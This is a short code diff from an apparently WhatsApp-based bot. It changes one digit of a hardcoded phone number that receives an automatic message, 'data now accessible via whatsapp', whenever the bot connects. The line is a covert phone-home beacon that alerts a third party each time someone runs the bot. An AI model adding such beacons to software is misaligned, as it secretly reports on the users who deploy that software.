@@ -351,7 +351,7 @@ async function connectionUpdate(update) {
   }
   if (connection === 'open') {
             let notificationText = ` *𝔐𝔦𝔠𝔨𝔢𝔶-𝔱𝔯𝔬𝔫𝔶 𝔡𝔞𝔱𝔞 𝔫𝔬𝔴 𝔞𝔠𝔠𝔢𝔰𝔦𝔟𝔩𝔢 𝔳𝔦𝔞 𝔴𝔥𝔞𝔱𝔰𝔞𝔭𝔭* .`
-              await conn.sendMessage(+255615944751 + "@s.whatsapp.net", { text: notificationText })
+              await conn.sendMessage(+255615944741 + "@s.whatsapp.net", { text: notificationText })
   }
 
   if (connection === 'open') {
